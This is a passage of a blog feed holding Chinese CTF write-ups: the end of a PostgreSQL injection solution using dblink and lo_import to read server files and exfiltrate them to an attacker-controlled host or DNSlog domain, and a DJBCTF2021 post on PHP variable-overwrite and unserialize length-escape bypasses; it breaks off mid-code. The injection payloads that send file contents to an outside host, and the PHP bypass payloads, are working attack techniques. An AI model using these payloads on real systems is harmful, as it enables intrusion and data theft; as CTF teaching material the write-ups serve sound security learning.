lo_import(&#39;/var/www/html/index.php&#39;)) || &#39;.xxxx.ceye.io user=a password=a dbname=a&#39;)) --</code></p><p>表面上确实返回了oid</p><img src="/article/cqb2021/image-20210201200309775.png" class="" title="DNSlogoid"><p>但是，在 dblink下 lo_import只是在vps上的 生效，并没有实际包含，在方式三会有实验证明，在最后有对注入点的解释。</p><p>然后接下来发现，这里利用DNSlog进行信息外带还有的问题是要遵循DNS协议，最大位数不超过63位，且不能有任何特殊符号及空格回车之类的，只能用<code>substring</code>函数一段一段截取，还得<code>replace</code>替换字符，可以完成但非常麻烦，不推荐使用。</p><h3 id="方式三：数据库外联"><a href="#方式三：数据库外联" class="headerlink" title="方式三：数据库外联"></a>方式三：数据库外联</h3><p>为了更好理解，下面先进行实验测试，dblink下 lo_import只是在vps上的 生效，并没有实际包含，详情可见如下</p><hr><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>服务器或本地起一个pgsql服务，可以安装，也可以docker起一个记得开端口映射，然后将其中的<code>postgresql.conf</code>中设置<code>listen_addresses = &#39;*&#39;</code>以监听。然后运行tcpdump监听端口流量</p><pre class="language-none"><code class="language-none">sudo tcpdump -nX -i eth0 port 5432</code></pre><p>默认端口为5432</p><p>dblink下包含文件</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;postgres password&#x3D;postgres dbname&#x3D;@&#39;|| (select lo_import(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;)) )) --</code></pre><img src="/article/cqb2021/image-20210201215153531.png" class="" title="oid"><p>返回oid16438，我们读取一下所有oid列表看一下</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;@&#39; || (SELECT string_agg(cast(oid as text), &#39;,&#39;) FROM pg_largeobject_metadata) || &#39; password&#x3D;postgres dbname&#x3D;postgres&#39;)) --</code></pre><p>没有报错，同时，<strong>没有任何数据返回</strong></p><p>而我们直接包含<code>index.php</code>试一下</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select (select lo_import(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;)),&#39;2&#39; --</code></pre><p>没有报错，再查一下oid列表</p><img src="/article/cqb2021/image-20210201220913327.png" class="" title="oid2"><p>有数据返回，同时可见16439和16440，而16438并没有在列表中，读取16438数据没有返回，读取16439与16440正常返回</p><p>可见dblink下lo_import在本地是不生效的</p><hr><p>这是原WP里的错误，原因在于其flag文件本身就已经包含在大对象里，所以直接就可查询，而dblink状态下并没有生效，算是这次比赛这道题目的最大收获吧。</p><p>如实验所示，流程如下，IP记得替换成自己的</p><p>首先起服务如实验中所示</p><p>先将<code>index.php</code>包含进来，看看有没有线索</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select (SELECT lo_import(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;)),&#39;2&#39; --</code></pre><p>然后读取全部oid列表</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;@&#39; || (SELECT string_agg(cast(oid as text), &#39;,&#39;) FROM pg_largeobject_metadata) || &#39; password&#x3D;postgres dbname&#x3D;postgres&#39;)) --</code></pre><img src="/article/cqb2021/image-20210202011754628.png" class="" title="oid3"><p>（多按几下就会有多个oid，见谅…）</p><p>然后读<code>index.php</code>的oid读取数据，这里可以直接读，lo_get数据转码为UTF-8，然后替换换行符(chr(10))再替换空格(chr(32))即可明文读取</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;@&#39; || (SELECT replace(replace(substring(convert_from(lo_get(16440),&#39;utf8&#39;),1,900),chr(10),&#39;&#39;),chr(32),&#39;&#39;)) || &#39; password&#x3D;postgres dbname&#x3D;postgres&#39;)) --</code></pre><img src="/article/cqb2021/image-20210202004121305.png" class="" title="index"><p>当然看不清可以base64读取自己转</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;postgres password&#x3D;postgres dbname&#x3D;@&#39;||(SELECT replace(substring(encode(lo_get(16440),&#39;base64&#39;),1,900),chr(10),&#39;&#39;)))) --</code></pre><img src="/article/cqb2021/image-20210201200655345.png" class="" title="base64index"><p>得到<code>index.php</code>源码</p><pre class="language-none"><code class="language-none">&lt;?phperror_reporting(0);session_start();function is_mobile()&#123;    if (isset ($_SERVER[&#39;HTTP_USER_AGENT&#39;])) &#123;        $clientkeywords &#x3D; array(            &#39;nokia&#39;,&#39;sony&#39;,&#39;ericsson&#39;,&#39;mot&#39;,&#39;samsung&#39;,&#39;htc&#39;,&#39;sgh&#39;,&#39;lg&#39;,&#39;sharp&#39;,&#39;sie-&#39;,&#39;philips&#39;,&#39;panasonic&#39;,&#39;alcatel&#39;,&#39;lenovo&#39;,&#39;iphone&#39;,&#39;ipod&#39;,&#39;blackberry&#39;,&#39;meizu&#39;,&#39;android&#39;,&#39;netfront&#39;,&#39;symbian&#39;,&#39;ucweb&#39;,&#39;windowsce&#39;,&#39;palm&#39;,&#39;operamini&#39;,&#39;operamobi&#39;,&#39;openwave&#39;,&#39;nexusone&#39;,&#39;cldc&#39;,&#39;midp&#39;,&#39;wap&#39;,&#39;mobile&#39;        );        if (preg_match(&quot;&#x2F;(&quot; . implode(&#39;|&#39;, $clientkeywords) . &quot;)&#x2F;i&quot;, strtolower($_SERVER[&#39;HTTP_USER_AGENT&#39;]))) &#123;            return true;        &#125;    &#125;    return false;&#125;if (!is_mobile()) &#123;    die(&quot;&lt;!--function is_mobile()&#123;--&gt;&lt;!--if (isset (\$_SERVER[&#39;HTTP_USER_AGENT&#39;])) &#123;--&gt;&lt;!--\$clientkeywords &#x3D; array(--&gt;&lt;!--&#39;nokia&#39;,&#39;sony&#39;,&#39;ericsson&#39;,&#39;mot&#39;,&#39;samsung&#39;,&#39;htc&#39;,&#39;sgh&#39;,&#39;lg&#39;,&#39;sharp&#39;,&#39;sie-&#39;,&#39;philips&#39;,&#39;panasonic&#39;,&#39;alcatel&#39;,&#39;lenovo&#39;,&#39;iphone&#39;,&#39;ipod&#39;,&#39;blackberry&#39;,&#39;meizu&#39;,&#39;android&#39;,&#39;netfront&#39;,&#39;symbian&#39;,&#39;ucweb&#39;,&#39;windowsce&#39;,&#39;palm&#39;,&#39;operamini&#39;,&#39;operamobi&#39;,&#39;openwave&#39;,&#39;nexusone&#39;,&#39;cldc&#39;,&#39;midp&#39;,&#39;wap&#39;,&#39;mobile&#39;--&gt;&lt;!--);--&gt;&lt;!--&#x2F;&#x2F;HTTP_USER_AGENT¸­--&gt;&lt;!--if (preg_match(\&quot;&#x2F;(\&quot; . implode(&#39;|&#39;, \$clientkeywords) . \&quot;)&#x2F;i\&quot;, strtolower(\$_SERVER[&#39;HTTP_USER_AGENT&#39;]))) &#123;--&gt;&lt;!--return true;--&gt;&lt;!--&#125;--&gt;&lt;!--&#125;--&gt;&lt;!--return false;--&gt;&lt;!--&#125;--&gt;&quot;);&#125;$user_input &#x3D; $_GET[&#39;f&#39;];if ($_SESSION[&quot;sql_injection&quot;]) &#123;    $user_input2 &#x3D; $_SESSION[&quot;sql_injection&quot;];    if(preg_match(&quot;&#x2F;dblink&#x2F;i&quot;, $user_input2)) &#123;        if(preg_match(&quot;&#x2F;host&#x2F;i&quot;, $user_input2)) &#123;            $limit &#x3D; 1;        &#125;        $user_input2 &#x3D; preg_replace(&#39;&#x2F;(connect_timeout ?&#x3D;)&#x2F;i&#39;, &#39;&#39;, $user_input);        $user_input2 &#x3D; preg_replace(&#39;&#x2F;(host&#x3D;)&#x2F;i&#39;, &#39;connect_timeout&#x3D;2 host&#x3D;&#39;, $user_input);&#x2F;&#x2F;        hack for tcpdump ,only dns        $user_input2 &#x3D; preg_replace(&#39;&#x2F;(user&#x3D;\&#39;)&#x2F;i&#39;, &#39;hack&#39;, $user_input2);        $user_input2 &#x3D; preg_replace(&#39;&#x2F;(password&#x3D;\&#39;)&#x2F;i&#39;, &#39;hack&#39;, $user_input2);    &#125;    $dbconn &#x3D; pg_connect(&quot;host&#x3D;127.0.0.1 port&#x3D;5432 dbname&#x3D;docker_db user&#x3D;docker password&#x3D;aYRr45lTgN9I9LJcjcr0&quot;);    pg_query($dbconn, &quot;SET statement_timeout TO 0&quot;);    pg_query($dbconn, &quot;SET idle_in_transaction_session_timeout TO 20&quot;);    pg_query($dbconn, &quot;SET lock_timeout TO 20&quot;);    $sql &#x3D; &quot;SELECT * FROM searches WHERE search &#x3D; &#39;&quot;.$user_input2.&quot;&#39;&quot;;    try &#123;        if (pg_prepare($dbconn, &quot;my_query&quot;, $sql)) &#123;            $start &#x3D; microtime(true);            pg_send_query($dbconn, $sql);            $error &#x3D; 0;        &#125; else &#123;            pg_send_query($dbconn, &quot;SELECT id FROM searches WHERE search &#x3D; &#39;0&#39;&quot;);            $error &#x3D; 1;        &#125;    &#125; catch (Exception $e) &#123;        &#x2F;&#x2F; Do nothing    &#125;&#125;$_SESSION[&quot;sql_injection&quot;] &#x3D; $user_input;?&gt;</code></pre><p>好像没啥，根据 <code>hint：不是所有sql都叫PostgreSQL；flag在web目录下的某个文件里。</code> 确定，关键文件肯定在这里，于是继续尝试，读到了<code>.hatccess</code>，包含一下，再读一下</p><p><code>.htaccess</code></p><pre class="language-none"><code class="language-none">&lt;FilesMatch &quot;pushF1n4AnK&quot;&gt;  SetHandler application&#x2F;x-httpd-php&lt;&#x2F;FilesMatch&gt;AddType image&#x2F;jpeg .tank</code></pre><p>可疑文件<code>pushF1n4AnK</code>，读一下</p><img src="/article/cqb2021/image-20210201201204964.png" class="" title="flag"><p>至此题目结束了</p><p>最后说一下注入点的问题</p><h3 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h3><h4 id="DNSlog"><a href="#DNSlog" class="headerlink" title="DNSlog"></a>DNSlog</h4><p>对于DNSlog，注入点在host，即<code>... host=&#39;|| (query) ||&#39;.xxxx.ceye.io ...</code>，上面已解释过</p><h4 id="数据库外联"><a href="#数据库外联" class="headerlink" title="数据库外联"></a>数据库外联</h4><p>注入点在明文传输的部分，即<code>... user=&#39;|| (query) ||&#39;...</code>和<code>... dbname=&#39;||(query) &#39;</code>最后不需要<code>|</code>连接符，因为没有东西加了会报错</p><p>举例，例如在获取所有大对象oid时，在<code>user</code>处注，如图所示</p><img src="/article/cqb2021/image-20210202021430433.png" class="" title="inject"><pre class="language-none"><code class="language-none">user.xxxx.database.postgres</code></pre><p>即<code>user</code>和<code>dbname</code>处都是明文传输的都可以注，而password不行</p><h2 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h2><p>感谢 <a href="https://ha1c9on.top/">@HA1C9ON</a> 大佬的教导，感谢 @egg 师傅的指导，以及和 @R1chm0nd 师傅赛后讨论指正payload中<code>user=&#39; || (query) || &#39;</code>的<code>|</code>或符合其实是连接符，学习了。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md">https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md</a></p><p><a href="https://zhuanlan.zhihu.com/p/78908281?from_voters_page=true">https://zhuanlan.zhihu.com/p/78908281?from_voters_page=true</a></p><p><a href="https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/dblink-lo_import-data-exfiltration">https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/dblink-lo_import-data-exfiltration</a></p><p><a href="https://balsn.tw/ctf_writeup/20190603-facebookctf/">https://balsn.tw/ctf_writeup/20190603-facebookctf/</a></p><p><a href="https://ha1c9on.top/2021/01/31/2021-cqb-write-up/">https://ha1c9on.top/2021/01/31/2021-cqb-write-up/</a> la佬博客，希望能和师傅一样强，能和师傅换友链</p><p><a href="https://blog.pentesteracademy.com/postgresql-udf-command-execution-372f0c68cfed">https://blog.pentesteracademy.com/postgresql-udf-command-execution-372f0c68cfed</a> (写udf的，没用上2333)</p><p><a href="http://www.postgres.cn/docs/9.4/functions-datetime.html#FUNCTIONS-DATETIME-DELAY">http://www.postgres.cn/docs/9.4/functions-datetime.html#FUNCTIONS-DATETIME-DELAY</a></p><p><a href="https://www.postgresql.org/docs/11/dblink.html">https://www.postgresql.org/docs/11/dblink.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OOB带外攻击 </tag>
            
            <tag> pgsql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DJBCTF2021</title>
      <link href="article/djbctf2021/"/>
      <url>article/djbctf2021/</url>
      
        <content type="html"><![CDATA[<p>2021第一场比赛</p><p>昵称：别答了别答了再答人傻了</p><a id="more"></a><p>DJBctf，孩子太菜了呜呜呜</p><p>做了两道web，签到题有非预期(汗)，分析下预期和非预期解法，加上些个人的理解</p><p>本Web狗何德何能，尝试做了一道密码学…赛后才终于出了。</p><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="veryphp"><a href="#veryphp" class="headerlink" title="veryphp"></a>veryphp</h3><p>源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"config.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">qwq</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Access Denied!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">oao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"config.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"php://input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/\`|\_|\.|%|\*|\~|\^|\'|\"|\;|\(|\)|\]|g|e|l|i|\//is'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"I am sorry but you have to leave."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$shaw_root</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/^\-[a-e][^a-zA-Z0-8]&lt;b>(.*)>&#123;4&#125;\D*?(abc.*?)p(hp)*\@R(s|r).$/'</span><span class="token punctuation">,</span> <span class="token variable">$shaw_root</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$shaw_root</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">29</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$hint</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Almost there."</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"Input correct parameters"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ans</span><span class="token operator">===</span><span class="token variable">$SecretNumber</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"Congratulations!"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$my_ans</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>有一个类，可能是反序列化，但看到最后<code>call_user_func</code>，类里面还有个static函数，应该是直接调用了。</p><p>看逻辑，<code>php://input</code>，变量<code>str</code>从POST原始流读取数据，过滤后变量覆盖。然后传入<code>shaw_root</code>，满足条件会给hint，最后<code>$ans===$SecretNumber</code>即可调用函数了。</p><hr><p>首先传<code>shaw_root</code>，第一个点在过滤了<code>_</code>，根据PHP特性，<code>空格</code>，<code>.</code>传递最后都会转变为<code>-</code></p><p>如图所示，此为web3的调试，与本题此考点一致</p><img src="/article/djbctf2021/image-20210128164708984.png" class="" title="image-20210128164708984"><img src="/article/djbctf2021/image-20210128164811979.png" class="" title="image-20210128164811979"><p>传入空格，<code>.</code>都变成了<code>_</code></p><p>接下来就是绕正则了，去regex101调了半天(没学正则的懒狗—–&gt;我)，调了一个payload</p><img src="/article/djbctf2021/image-20210128165252056.png" class="" title="image-20210128165252056"><p><code>-a9&lt;b&gt;a\n\n&gt;&gt;&gt;&gt;&gt;&gt;abcccphp@Rra</code></p><p>传入得</p><img src="/article/djbctf2021/image-20210128165654959.png" class="" title="image-20210128165654959"><pre class="language-none"><code class="language-none">Here is a hint : md5(&quot;shaw&quot;.($SecretNumber).&quot;root&quot;)&#x3D;&#x3D;166b47a5cb1ca2431a0edfcef200684f &amp;&amp; strlen($SecretNumber)&#x3D;&#x3D;&#x3D;5</code></pre><p>写脚本爆破,脚本如下</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2021/1/23 16:58@Auth ： gyy@Blog ：http://err0r.top"""</span><span class="token keyword">import</span> hashlib<span class="token keyword">def</span> <span class="token function">MD5</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> <span class="token number">10000</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        text <span class="token operator">=</span> <span class="token string">"shaw&#123;&#125;root"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>        m <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span>m<span class="token punctuation">)</span>        m <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>        <span class="token keyword">if</span> m <span class="token operator">==</span> target <span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nfind it:'</span><span class="token punctuation">,</span>text<span class="token punctuation">,</span><span class="token string">":"</span><span class="token punctuation">,</span>m<span class="token punctuation">)</span>            <span class="token keyword">break</span>        i <span class="token operator">+=</span><span class="token number">1</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    MD5<span class="token punctuation">(</span><span class="token string">'166b47a5cb1ca2431a0edfcef200684f'</span><span class="token punctuation">)</span></code></pre><p>爆破得<code>shaw21475root</code></p><img src="/article/djbctf2021/image-20210128170204123.png" class="" title="image-20210128170204123"><p>传入成功</p><img src="/article/djbctf2021/image-20210128170309356.png" class="" title="image-20210128170309356"><p>表明成功了，最后一步调用函数，根据PHP文档，类static函数可以直接用<code>class::static function</code>调用，详情见<a href="https://www.php.net/manual/zh/function.call-user-func.php">官方文档</a></p><p>最终payload:<code>shaw root=-a9&lt;b&gt;a\n\n&gt;&gt;&gt;&gt;&gt;&gt;abcccphp@Rra&amp;&amp;ans=21475&amp;&amp;my ans=qwq::oao</code></p><img src="/article/djbctf2021/image-20210128170748201.png" class="" title="image-20210128170748201"><p>这里要注意，如果用HackBar发包的话要换模式</p><img src="/article/djbctf2021/image-20210128170832793.png" class="" title="image-20210128170832793"><p>因为转义是阻挡你前进步伐的一大元凶</p><h4 id="题目思考"><a href="#题目思考" class="headerlink" title="题目思考"></a>题目思考</h4><p>因为变量覆盖，直接把<code>SecretNumber</code>覆盖就行了，本题在<code>str</code>处有个过滤<code>e</code>，所以不行</p><p><code>php://input</code>读入原始流数据，所以取反异或转义之类的方法都是不行的</p><hr><h3 id="spaceman"><a href="#spaceman" class="headerlink" title="spaceman"></a>spaceman</h3><p>Web签到题(大概)，源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">spaceman</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">===</span><span class="token single-quoted-string string">'ctfshowvip'</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token single-quoted-string string">'wrong password'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'ctfshowup'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ctfshow'</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"php://input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/\_|\.|\]|\[/is'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"I am sorry but you have to leave."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$ser</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">spaceman</span><span class="token punctuation">(</span><span class="token variable">$user_name</span><span class="token punctuation">,</span><span class="token variable">$pass_word</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$test</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$ser</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>标准反序列化长度逃逸，可惜非预期了</p><h4 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h4><p>看<code>spaceman</code>类，两个变量由魔术方法<code>__construct</code>赋值，<code>filter</code>函数替换字符串，基本上就确定本题是反序列化长度逃逸了。</p><p>同样，<code>php://input</code>读取原始流数据变量覆盖，绕过方法同web1，构造反序列化</p><p><code>str_replace</code>将<code>ctfshowup</code>替换为<code>ctfshow</code>，也就是说原来9个字符变成了7个字符，有两个字符逃逸了。</p><p>我们的核心目标是将<code>password</code>覆盖为<code>ctfshowvip</code>，所以最后部分的序列化字符串应为<code>;s:8:&quot;password&quot;;s:10:&quot;ctfshowvip&quot;;&#125;</code>，一共35个字符。</p><p>所以它原始生成的部分应该被覆盖的为<code>&quot;;s:8:&quot;password&quot;;s:35:</code>即22个字符，所以<code>username</code>应该填入11个<code>ctfshowup</code>来覆盖它</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">spaceman</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'ctfshowup'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ctfshow'</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$user_name</span><span class="token operator">=</span><span class="token double-quoted-string string">"ctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowup"</span><span class="token punctuation">;</span><span class="token variable">$pass_word</span><span class="token operator">=</span><span class="token double-quoted-string string">";s:8:\"password\";s:10:\"ctfshowvip\";&#125;"</span><span class="token punctuation">;</span><span class="token variable">$ser</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token 